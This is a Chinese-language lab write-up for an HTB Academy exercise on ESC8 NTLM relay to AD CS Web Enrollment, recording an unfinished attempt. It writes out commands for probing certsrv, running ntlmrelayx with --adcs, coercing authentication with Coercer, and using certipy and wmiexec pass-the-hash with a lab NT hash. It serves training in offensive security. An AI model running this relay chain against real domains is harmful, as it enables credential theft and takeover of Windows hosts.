# Writeup：Advanced NTLM Relay Attacks Targeting AD CS（ESC8 relay to Web Enrollment）

**Module 情境**：HTB Academy *NTLM Relay Attacks* 課程 → Advanced NTLM Relay Attacks Targeting AD CS 小節
**目標**：濫用 ESC8（或 ESC11）取得 WS01（172.16.117.50）的控制權，讀取 `C:\Users\Administrator\Desktop\flag.txt`
**攻擊機**：10.129.205.223（ens192: 172.16.117.30）
**認證**：`localws01` / NT hash `e4737f338324305993ed52f775a6d54d`

---

## 1. 確認 AD CS Web Enrollment 存在（ESC8 的前提）

```bash
curl -s -o /dev/null -w '%{http_code}\n' http://172.16.117.3/certsrv/
curl -s -o /dev/null -w '%{http_code}\n' http://172.16.117.3/certsrv/certfnsh.asp
nmap -p80,443 172.16.117.3 -oG - 2>/dev/null | grep -i open
```

```
401
401
Host: 172.16.117.3 (dc01)  Ports: 80/open/tcp//http///, 443/closed/tcp//https///
```

`/certsrv/` 回 401（需要認證但服務存在）、443 關閉（只有 HTTP，沒有 HTTPS/EPA）—— 這正是 **ESC8**（AD CS Web Enrollment over HTTP，沒有 Extended Protection for Authentication）的經典前提條件，比 ESC11（走 RPC/ICPR）更直接。

---

## 2. 確認 `localws01` 不是 WS01 的本機系統管理員

在開始找「如何升級」之前，先確認「現在到底有沒有權限」，避免白工：

```bash
cme smb 172.16.117.50 -u localws01 -H e4737f338324305993ed52f775a6d54d --local-auth --shares
```

```
SMB  172.16.117.50  445  WS01  [+] WS01\localws01:e4737f338324305993ed52f775a6d54d
SMB  172.16.117.50  445  WS01  Finance  READ
SMB  172.16.117.50  445  WS01  IPC$     READ
```

`cme --shares` 用 `NetShareEnum` 列舉，連 `ADMIN$`/`C$` 都沒列出來（代表這個帳號對它們沒有連線權限，不是單純「列不到名字」），實測也證實：

```bash
smbclient.py -hashes :e4737f338324305993ed52f775a6d54d localws01@172.16.117.50 -no-pass
# use C$ → STATUS_ACCESS_DENIED
```

**結論**：`localws01` 只是個普通本機帳號，不是本機管理員，直接讀 `C:\Users\Administrator\Desktop\flag.txt` 不可行 —— 必須透過 ESC8 relay 拿到一張能代表更高權限身份的憑證才能繼續，這也說明了這一節存在的意義。

---

## 3. 架設 ESC8 Relay（ntlmrelayx → certsrv）

跟 Kerberos 那一節共用同一組 `tmux` 長駐技巧（見另一篇 writeup 裡記錄的 stdin/EOF 坑），這裡直接用正確做法：

```bash
tmux new-session -d -s adcs
tmux send-keys -t adcs \
  'sudo ntlmrelayx.py -t http://172.16.117.3/certsrv/certfnsh.asp --adcs \
   --no-smb-server --no-wcf-server --no-raw-server 2>&1 | tee /tmp/adcs_relay.log' Enter
tmux send-keys -t adcs "$(cat ~/.pw)" Enter
```

`--adcs` 讓 `ntlmrelayx` 在拿到任何 relay 進來的認證後，自動對 `certsrv/certfnsh.asp` 送出憑證申請（依身份名稱是否以 `$` 結尾自動選 `Machine` 或 `User` 範本）。

---

## 4. 嘗試主動 coerce WS01（遇到跟 Kerberos 那節一樣的環境限制）

用 Coercer 對 WS01 跑了完整的 EFSR/MS-RPRN/MS-FSRVP 測試（各種 pipe、各種方法、`@80` WebDAV 格式），搭配 `tcpdump` 側錄做 ground truth：

```bash
sudo Coercer coerce -v -t 172.16.117.50 -u localws01 -d '.' \
  --hashes :e4737f338324305993ed52f775a6d54d -l 172.16.117.30 \
  --auth-type http --always-continue
```

雖然輸出會印出一堆 `[+] (ERROR_BAD_NETPATH)`（綠色，Coercer 把這個狀態當成「成功」指標），但同步跑的 `tcpdump -i ens192 'tcp port 80' and host 172.16.117.50` 確認 **實際封包數是 0**。

這跟前一篇 Authentication Coercion 的發現一致：**`ERROR_BAD_NETPATH` 這個狀態只代表 RPC call 的回傳例外字串裡含有這個關鍵字，不代表攻擊機真的收到連線**（詳見 Coercer 原始碼 `network/authentications.py` 的判定邏輯）。本環境裡，主動用 RPC coercion（不管是 EFSR 的 `\PIPE\lsarpc`/`lsass`/`netlogon`/`samr`，還是 MS-RPRN 的 PrinterBug）都沒有真正讓 WS01 對外發起連線。

---

## 5. 目前狀態（誠實記錄）

- AD CS Web Enrollment（ESC8 前提）已確認存在，`ntlmrelayx --adcs` 已正確架設並長駐在 tmux session `adcs` 裡等待連線。
- 已證實 `localws01` 不是 WS01 本機管理員，**必須**透過 ESC8 relay 升級才能讀到 flag，不是「忘記試試看直接讀」。
- 主動 coercion（Coercer 的 EFSR / MS-RPRN / MS-FSRVP 全部協定組合）在本環境對 WS01 一律無法產生真實的對外連線（`tcpdump` 側錄驗證）。
- 與 Kerberos 模組共用的被動觸發點（`\\DC01\Testing` 上的 `.searchConnector-ms`，指向 `http://172.16.117.30/windows`）如果被 WS01 瀏覽到，會同時滿足這一節「取得 WS01 的 HTTP NTLM 認證」的需求 —— 目前持續等待該觸發，relay 才能進到「申請憑證 → `certipy auth` 換 NT hash / TGT → 存取 WS01」的後續步驟。
- 因為 `localws01` 不是 WS01 admin，且 Coercer 主動觸發不可靠，**判斷本題的被動觸發來源機率較高是「WS01 自己瀏覽 `\\DC01\Testing`」**，而不是「有人瀏覽 WS01 上的 Finance 分享」；Finance 分享本身 `localws01` 也只有 READ，無法在上面放誘餈驗證這個假設。

---

## 6. 後續步驟（relay 成功拿到憑證之後要做的事，先記錄下來）

一旦 `ntlmrelayx --adcs` 真的 relay 到一筆認證並成功申請到憑證（log 會印出 `.pfx` 檔案路徑），後續流程：

```bash
# 用拿到的憑證做 PKINIT，換出 NT hash（UnPAC-the-Hash）
certipy auth -pfx <relayed-identity>.pfx -dc-ip 172.16.117.3

# 如果relay 到的是 WS01$ 本身，拿到它的 NT hash 後可以：
# 1) 直接 PtH 對 WS01 嘗試本機系統層級存取（機器帳號在本機 Session 0 等效 SYSTEM 的場景）
# 2) 或用這張憑證／hash 進一步做 S4U2self 冒充 Administrator 存取 WS01 的服務
wmiexec.py -hashes :<WS01$ NT hash> 'WS01$@172.16.117.50'
```

這部分待實際拿到憑證後補上真實輸出。
